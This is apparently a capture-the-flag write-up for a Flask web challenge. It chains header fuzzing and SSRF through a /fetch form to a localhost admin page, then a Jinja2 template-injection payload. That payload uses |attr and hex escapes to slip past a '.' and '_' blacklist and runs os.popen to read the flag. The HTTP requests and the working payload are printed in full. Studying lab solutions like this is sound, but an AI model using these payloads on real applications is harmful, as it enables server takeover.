- We see a simple index page, without much functionality.
- going to `/robots.txt` shows the following entries:
```
User-agent: *
Disallow: /admin
Disallow: /fetch

# internal SSRF testing tool requires special auth header to be set to 'true'
```
- when we go to `/fetch` we get an error about a header.
- if we go on github and find a header wordlist and fuzz our headers with the `true` value we see the expected header is `allow: true`

- When we go to this endpoint we see the following HTML
```html
        <form method="POST">
            <input name="url" placeholder="Enter URL to fetch">
            <button type="submit">Fetch</button>
        </form>
        
```

- This tells us we need to send a POST request with a body that passes in a URL.
    - We need to set the `Content-Type` of our request to `application/x-www-form-urlencoded` because this is a form.
    - This shouldn't increase the difficulty of the challenge, LLMs exist...

- Now the user needs to fuzz localhost port to find any services or the web service it locally maps to:
```
POST /fetch HTTP/1.1
Host: YOURS_HERE FOR CTFD
allow: true
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

url=http://127.0.0.1:FUZZ/
```
- after fuzzing port ranges we see port `3000` gets a hit

- when we go to `/admin` locally we get the below error:
```
Missing ?template= parameter in the URL
```

- We have SSTI
    - `url=http://127.0.0.1:3000/admin?template={{7*7}}`

- Let's go online and find a one-shot RCE since we know this is Flask (response headers have `Werkzeug/3.1.3` in them.)
- When we try a simple RCE we get this message:
    - `url=http%3a%2f%2f127.0.0.1%3a3000%2fadmin%3ftemplate%3dsendPayload(%22%7b%7b__import__('subprocess').check_call('id')%20%7d%7d%22)`
    - Response: `nope.`
- Okay, so we have a black-list presumably, let's fuzz all special characters and see which give this `nope.` error:
```
POST /fetch HTTP/1.1
Host: YOUR CTFD HOST HERE
allow: true
Content-Type: application/x-www-form-urlencoded
Content-Length: 130

url=http%3a%2f%2f127.0.0.1%3a3000%2fadmin%3ftemplate%3dsendPayload(%22%7b%7b__import__('subprocess').check_call('id')%20%7d%7d%22)
```

- After fuzzing we see that both `.` and `_` are blacklisted.
- Luckily for us we can bypass these static checks by pulling values from the URL parameter and we can prevent the use of `.` by using `|attr` to pull attributes. The cool part about using a function in Flask templatting is they're within quotes and we can `Hex Encode` them to get past the `_` blacklist.
    - it's important to note that you can't just do `?template={{request.args.param}}&param={{7*7}}` because `param` value is treated as a `string`.

- However, the below solution aims to walk to the global objects from the `application` attribute of the `request` object which gives us access to all gadgets and we walk our way down to the builtin `import` gadget and import the `os` module and open a `popen` pipe to get RCE and read the flag

- The below payload is the working one that takes 
```
http%3A%2F%2Flocalhost%3A3000%2Fadmin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /app/flag\x2etxt')|attr('read')()}}
```






